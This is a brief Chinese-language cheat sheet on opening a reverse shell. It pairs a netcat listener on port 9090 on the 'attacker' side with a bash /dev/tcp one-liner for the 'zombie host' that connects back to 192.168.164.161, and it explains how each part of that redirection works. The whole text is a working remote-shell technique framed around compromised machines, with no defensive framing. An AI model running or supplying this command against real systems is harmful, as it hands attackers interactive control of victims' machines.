# 攻击端

	~]# nc -lvvp 9090		#监听本机IP 9090端口

# 肉鸡

	~]# bash -i &> /dev/tcp/192.168.164.161/9090 0>&1
	
	bash -i ：启动一个子shell进程
	&>		：将标准输出和标准错误都重定向到我们指定的文件中
	/dev/tcp/192.168.164.161/9090	：特殊文件，会建议一个到192.168.164.161 9090的socket连接
	0>&1	：&>使得标准输出重定向到了我们的TCP连接上，然后0>&1使得标准输入又重定向到了标准输出中，最终的结果就是标准输入也被重定向到了TCP连接中，因此输入和输出都可以在公网主机上进行，通过TCP连接和bash进行交互